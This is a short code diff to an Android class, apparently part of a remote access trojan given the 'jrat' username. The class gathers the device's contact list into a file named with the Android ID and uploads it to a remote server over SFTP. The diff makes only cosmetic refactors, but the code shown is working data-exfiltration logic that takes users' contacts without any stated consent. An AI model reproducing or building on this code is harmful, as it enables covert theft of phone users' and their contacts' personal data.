@@ -38,9 +38,9 @@ public class SendContactListAsyncTask extends AsyncTask<Context, Void, String> {
     protected String doInBackground(Context...params) {
 
         // Connection variables
-        JSch jsch = null;
+        JSch jsch;
+        Channel channel;
         Session session = null;
-        Channel channel = null;
         ChannelSftp c = null;
 
         String username = "jrat";
@@ -69,7 +69,7 @@ public class SendContactListAsyncTask extends AsyncTask<Context, Void, String> {
         }
 
         // Create a file with the contact list to send to the remote server
-        File file = new File(Environment.getExternalStorageDirectory() + File.separator + android_id+"-contacts"+".txt");
+        File file = new File(Environment.getExternalStorageDirectory() + File.separator + android_id+"-contacts.txt");
         try {
             file.createNewFile();
         } catch (IOException e) {
@@ -113,7 +113,7 @@ public class SendContactListAsyncTask extends AsyncTask<Context, Void, String> {
             // Send file to server
             try {
                 System.out.println("Starting File Upload:");
-                String fsrc = file.getPath(), fdest = android_id+"-contacts"+".txt";
+                String fsrc = file.getPath(), fdest = android_id+"-contacts.txt";
                 c.put(fsrc, fdest);
             } catch (Exception e) {
                 e.printStackTrace();
